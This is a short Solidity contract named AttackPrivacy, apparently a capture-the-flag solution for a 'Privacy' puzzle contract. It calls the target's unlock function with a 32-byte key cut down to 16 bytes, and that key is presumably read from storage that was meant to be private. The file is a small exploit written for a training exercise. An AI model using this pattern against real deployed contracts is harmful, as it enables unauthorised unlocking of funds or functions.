// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPrivacy {
  function unlock(bytes16 _key) external;
}

contract AttackPrivacy {

  IPrivacy public privacyContract;

  constructor(address _privacyContract) {
    privacyContract = IPrivacy(_privacyContract);
  }

  function unlockPrivacyContrack(bytes32 _key) external  {
    privacyContract.unlock(bytes16(_key));
  }
}